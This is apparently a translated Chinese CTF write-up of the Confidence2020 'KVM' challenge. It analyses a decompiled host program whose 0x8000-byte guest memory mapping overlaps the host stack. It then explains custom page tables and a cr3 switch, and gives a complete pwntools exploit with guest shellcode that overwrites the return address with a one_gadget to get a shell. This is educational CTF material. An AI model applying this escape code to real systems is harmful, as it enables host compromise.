# Confidence2020 CTF KVM

阅读量 **170384**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-02 15:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t015c9f0a9ddfc59136.jpg)

## 前置知识

参考链接：<https://lwn.net/Articles/658511/>  
以及resery师傅的博客：<http://www.resery.top/2020/09/13/Confidence2020%20CTF%20KVM%20Writeup/>

## 题目分析

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int result; // eax
      int errno_kvm; // eax
      int errno_create_kvm; // eax
      int errno_set_user_memory; // eax
      int errno_create_vcpu; // eax
      int errno_set_regs; // eax
      int errno_get_sregs; // eax
      int errno_set_sregs; // eax
      __u32 exit_reason; // eax
      unsigned int code_size; // [rsp+Ch] [rbp-8274h]
      int kvmfd; // [rsp+10h] [rbp-8270h]
      int vmfd; // [rsp+14h] [rbp-826Ch]
      int vcpu; // [rsp+18h] [rbp-8268h]
      int v16; // [rsp+1Ch] [rbp-8264h]
      char *aligned_guest_mem; // [rsp+20h] [rbp-8260h]
      size_t vcpu_mmap_size; // [rsp+28h] [rbp-8258h]
      kvm_run *run_mem; // [rsp+30h] [rbp-8250h]
      __int64 v20; // [rsp+38h] [rbp-8248h]
      __int64 v21; // [rsp+40h] [rbp-8240h]
      __int64 v22; // [rsp+48h] [rbp-8238h]
      __u64 v23; // [rsp+50h] [rbp-8230h]
      __u64 v24; // [rsp+58h] [rbp-8228h]
      __int64 v25; // [rsp+60h] [rbp-8220h]
      __int64 v26; // [rsp+68h] [rbp-8218h]
      __int64 v27; // [rsp+70h] [rbp-8210h]
      kvm_userspace_memory_region region; // [rsp+80h] [rbp-8200h]
      kvm_regs guest_regs; // [rsp+A0h] [rbp-81E0h]
      kvm_sregs guest_sregs; // [rsp+130h] [rbp-8150h]
      char guest_mem[32776]; // [rsp+270h] [rbp-8010h]
      unsigned __int64 v32; // [rsp+8278h] [rbp-8h]
      __int64 savedregs; // [rsp+8280h] [rbp+0h]
    
      v32 = __readfsqword(0x28u);
      memset(guest_mem, 0, 0x8000uLL);
      aligned_guest_mem = &guest_mem[4096LL - ((&savedregs + 0x7FF0) & 0xFFF)];// 
    
                                                    // 这里的功能是让aligned_guest_mem取整
                                                    // 举个例子就是假如guest_mem的起始地址为0x7fffffff5c50
                                                    // 让他取整就是取到0x7fffffff6000
      code_size = -1;
      read_n(4LL, &code_size);                      // 这里需要输入的字符转成对应的数字需要小于0x4000,所以说输入的就应该是\x00\x40\x00\x00
      if ( code_size <= 0x4000 )
      {
        read_n(code_size, aligned_guest_mem);       // 如果按照上面咱们输入的\x00\x40\x00\x00的话,咱们就需要输入0x4000个字符
                                                    // 然后这些字符存储到aligned_guest_mem中
        kvmfd = open("/dev/kvm", 0x80002);
        if ( kvmfd < 0 )
        {
          errno_kvm = open("/dev/kvm", 0x80002);
          kvmfd = errno_kvm;
          err(errno_kvm, "fail line: %d", 40LL);
        }
        // 0xAE01 : KVM_CREATE_VM
        vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL);        // 创建虚拟机，获取到虚拟机句柄
        if ( vmfd < 0 )
        {
          errno_create_kvm = ioctl(kvmfd, 0xAE01uLL, 0LL);
          vmfd = errno_create_kvm;
          err(errno_create_kvm, "fail line: %d", 43LL);
        }
        region.slot = 0LL;
        region.guest_phys_addr = 0LL;
        region.memory_size = 0x8000LL;
        region.userspace_addr = aligned_guest_mem;
        // 0x4020ae46 : KVM_SET_USER_MEMORY_REGION
        if ( ioctl(vmfd, 0x4020AE46uLL, &region) < 0 )// 为虚拟机映射内存,还有其他的PCI,信号处理的初始化
        {
          errno_set_user_memory = ioctl(vmfd, 0x4020AE46uLL, &region);
          err(errno_set_user_memory, "fail line: %d", 52LL);
        }
        // 0xae41 : KVM_CREATE_VCPU
        vcpu = ioctl(vmfd, 0xAE41uLL, 0LL);         // 创建vCPU
        if ( vcpu < 0 )
        {
          errno_create_vcpu = ioctl(vmfd, 0xAE41uLL, 0LL);
          vcpu = errno_create_vcpu;
          err(errno_create_vcpu, "fail line: %d", 55LL);
        }
    
        // 0xAE04uLL : KVM_GET_VCPU_MMAP_SIZE
        vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);// 为vCPU分配内存空间
        run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpu, 0LL);
        memset(&guest_regs, 0, sizeof(guest_regs));
        guest_regs._rsp = 0xFF0LL;
        guest_regs.rflags = 2LL;
        // 0x4090ae82 : KVM_SET_REGS
        if ( ioctl(vcpu, 0x4090AE82uLL, &guest_regs) < 0 )// 设置寄存器
        {
          errno_set_regs = ioctl(vcpu, 0x4090AE82uLL, &guest_regs);
          err(errno_set_regs, "fail line: %d", 66LL);
        }
        // 0x8138AE83uLL : KVM_GET_SREGS
        if ( ioctl(vcpu, 0x8138AE83uLL, &guest_sregs) < 0 )// 获取特殊寄存器
        {
          errno_get_sregs = ioctl(vcpu, 0x8138AE83uLL, &guest_sregs);
          err(errno_get_sregs, "fail line: %d", 69LL);
        }
        v20 = 0x7000LL;
        v21 = 0x6000LL;
        v22 = 0x5000LL;
        v23 = 0x4000LL;
        *(aligned_guest_mem + 0xE00) = 3LL;         // 设置4级页表,因为cr0对应的第31位的值为1,所以说开启了分页机制所以就需要设置4级页表
                                                    // 这里看了一眼汇编代码这里虽然加的是0xe00,但是对应汇编代码加的还是0x7000
        *&aligned_guest_mem[v20 + 8] = 0x1003LL;
        *&aligned_guest_mem[v20 + 16] = 0x2003LL;
        *&aligned_guest_mem[v20 + 24] = 0x3003LL;
        *&aligned_guest_mem[v21] = v20 | 3;
        *&aligned_guest_mem[v22] = v21 | 3;
        *&aligned_guest_mem[v23] = v22 | 3;
        v25 = 0LL;
        v26 = 0x1030010FFFFFFFFLL;
        v27 = 0x101010000LL;
        guest_sregs.cr3 = v23;
        guest_sregs.cr4 = 32LL;
        guest_sregs.cr0 = 0x80050033LL;
        guest_sregs.efer = 0x500LL;
        guest_sregs.cs.base = 0LL;
        *&guest_sregs.cs.limit = 0x10B0008FFFFFFFFLL;
        *&guest_sregs.cs.dpl = 0x101010000LL;
        guest_sregs.ss.base = 0LL;
        *&guest_sregs.ss.limit = 0x1030010FFFFFFFFLL;
        *&guest_sregs.ss.dpl = 0x101010000LL;
        guest_sregs.gs.base = 0LL;
        *&guest_sregs.gs.limit = 0x1030010FFFFFFFFLL;
        *&guest_sregs.gs.dpl = 0x101010000LL;
        guest_sregs.fs.base = 0LL;
        *&guest_sregs.fs.limit = 0x1030010FFFFFFFFLL;
        *&guest_sregs.fs.dpl = 0x101010000LL;
        guest_sregs.es.base = 0LL;
        *&guest_sregs.es.limit = 0x1030010FFFFFFFFLL;
        *&guest_sregs.es.dpl = 0x101010000LL;
        guest_sregs.ds.base = 0LL;
        *&guest_sregs.ds.limit = 0x1030010FFFFFFFFLL;
        *&guest_sregs.ds.dpl = 0x101010000LL;
        // 0x4138AE84 : KVM_SET_SREGS
        if ( ioctl(vcpu, 0x4138AE84uLL, &guest_sregs) < 0 )// 设置特殊寄存器
        {
          errno_set_sregs = ioctl(vcpu, 0x4138AE84uLL, &guest_sregs);
          err(errno_set_sregs, "fail line: %d", 105LL);
        }
        // 0xae80 : KVM_RUN
        while ( 1 )
        {
          ioctl(vcpu, 0xAE80uLL, 0LL);              // 开始运行虚拟机
          exit_reason = run_mem->exit_reason;
          if ( exit_reason == 5 || exit_reason == 8 )// KVM_EXIT_HLT | KVM_EXIT_SHUTDOWN
            break;
          if ( exit_reason == 2 )                   // KVM_EXIT_IO
          {
            if ( run_mem->io.direction == 1 && run_mem->io.port == 0x3F8 )
            {
              v16 = run_mem->io.size;
              v24 = run_mem->io.data_offset;
              printf("%.*s", v16 * run_mem->ex.error_code, run_mem + v24);
            }
          }
          else
          {
            printf("\n[loop] exit reason: %d\n", run_mem->exit_reason);
          }
        }
        puts("\n[loop] goodbye!");
        result = 0;
      }
      else
      {
        puts("[init] hold your horses");
        result = 1;
      }
      return result;
    }
    

**漏洞点：**

    
    
    memset(guest_mem, 0, 0x8000uLL);
    aligned_guest_mem = &guest_mem[4096LL - ((&savedregs + 0x7FF0) & 0xFFF)];
    
    region.slot = 0LL;
    region.guest_phys_addr = 0LL;
    region.memory_size = 0x8000LL;
    region.userspace_addr = aligned_guest_mem;
    

从上面的代码可以看出程序预计给虚拟机分配0x8000大小的空间，然后进行了个对齐操作使得分配的真实地址为aligned_guest_mem，然后后面实际再给虚拟机分配的时候依然还是分配了0x8000大小的空间，这样就会导致虚拟机越界读到了主机的内存。

首先我们看到我们memset的地址如下

![](https://p1.ssl.qhimg.com/t0182d20c390d39d38b.png)

对齐后的地址如下。

![](https://p4.ssl.qhimg.com/t01e6df6fb628777d7c.png)

通过动态调试我们发现返回地址所在地址`(0x7FFFFFFFDE68)`包含在`aligned_guest_mem(0x7FFFFFFF6000)`到`aligned_guest_mem+0x8000(0x7FFFFFFFE000)`内，注意此处的aligned_guest_mem是通过分配host的栈空间作为VM的进程空间。对于host来说地址是`aligned_guest_mem`到`aligned_guest_mem+0x8000`，而对于虚拟机来说地址是`0`到`0x8000`。

![](https://p5.ssl.qhimg.com/t015c98b325ff3e8dcc.png)

用下图来更清晰的表示。

![](https://p3.ssl.qhimg.com/t01c506dd005e23e1fe.png)

然后程序有两个输入点，第一个输入的值会作为第二个输入点的可输入长度然后第二个输入点，输入的内容可以作为shellcode执行。

下面就是利用这个地方，在动调的过程中可以发现最后main返回的地址是存储在over这个区域的，所以就需要对存储返回地址的地方进行写操作，写成onegadget的地址就可以拿到shell了，写操作需要注意的就是[0x1000]这样读0x1000地址存储的内容不一定会读到0x1000，因为有分页机制所以虚拟地址需要转换成物理地址才可以使用，还需要注意一点的是64位环境下使用的是4级页表是48位，然后分为9、9、9、12四段，如下图所示。

![](https://p2.ssl.qhimg.com/t0136ccfe8fa6d6f4c0.png)

根据这四段来获取到物理地址所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址。

具体的做法就是 **更改cr3的值** ， **自己构造4级页表** ， **促使[0x1000]这样访问到的内存就是0x7000地址处的内存**
，这里访问到0x7000是因为0x7000到0x8000包含了越界的部分，所以我们只需要循环遍历0x7000到0x8000以便找到ebp，从而控制执行流，其中页表的访问方式就应该是这样的，用我手画的图表示如下（以访问0x1000为例）：

![](https://p4.ssl.qhimg.com/t01cab5136f22076d18.png)

后面的0x1003、0x2003、0x3003等在ida中可看到。

    
    
    v20 = 0x7000LL;
    v21 = 0x6000LL;
    v22 = 0x5000LL;
    v23 = 0x4000LL;
    *(aligned_guest_mem + 0xE00) = 3LL;
    *&aligned_guest_mem[v20 + 8] = 0x1003LL;
    *&aligned_guest_mem[v20 + 16] = 0x2003LL;
    *&aligned_guest_mem[v20 + 24] = 0x3003LL;
    

所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址，然后把返回地址改成oengadget就可以拿到shell了。

exp最开始设置访问的地址是0x1020，然后一直循环访问到对应地址存储的内容不是0的地方，经过动调发现在retun的返回地址前只有3个地址是有内容的，再往前看都是0，所以循环结束后访问的地址就是return的返回地址-3，所以要修改retuen的地址就需要+3，然后把这个地址里面的内容修改成one_gadget就可以拿到shell了。

    
    
    from pwn import *
    context.arch = 'amd64'
    p = process("./kvm")
    elf = ELF("./kvm")
    payload = asm(
        """
        mov qword ptr [0x1000], 0x2003
        mov qword ptr [0x2000], 0x3003
        mov qword ptr [0x3000], 0x0003
        mov qword ptr [0x0], 0x3
        mov qword ptr [0x8], 0x7003
    
        mov rax, 0x1000
        mov cr3, rax
    
        mov rcx, 0x1020
    #############search ret#############
    look_for_ra:   
        add rcx, 8
        cmp qword ptr [rcx], 0
        je look_for_ra
    
        add rcx, 24
    #############overwrite ret#############
    overwrite_ra:  
        mov rax, qword ptr [rcx]
        add rax, 0x249e6
        mov qword ptr [rcx], rax
        hlt
        """
    )
    log.success('len = '+str(len(payload)))
    p.send("\x68\x00\x00\x00")
    p.sendline(payload)
    #gdb.attach(p)
    p.recv(16)
    #gdb.attach(p)
    p.interactive()
    

对于exp几个疑惑的点：

  * 0x1020 ：这里我本来写的是0x1000，但是没打通，在0x7000开始处我们写了四个字段，所以我们应该先跳过这四个字段开始，经过动态调试发现返回地址只有前面三个字段有内容，其他都是0，所以一次遍历到不为0为止，然后我们add 24，跳过这三个字段就能到达ret处。
  * 0x249e6 : 这里是返回地址到one_gadget地址的偏移，动态调试后发现execve_addr-ret_addr=0x249e6。

成功利用截图：

![](https://p1.ssl.qhimg.com/t017b9eb1ac9c6edc13.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **.** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254790](/post/id/254790)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF KVM](/tag/CTF KVM)

 **+1** __2赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/8Fh08IZXW3IRX6aFpdF0f7ictxCRDGGlicib3WWkiaTL15Lj6s3VvjlvP95FuZHhcUg92cPEO3hibD5hzcX0nIfLbYg/132).

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

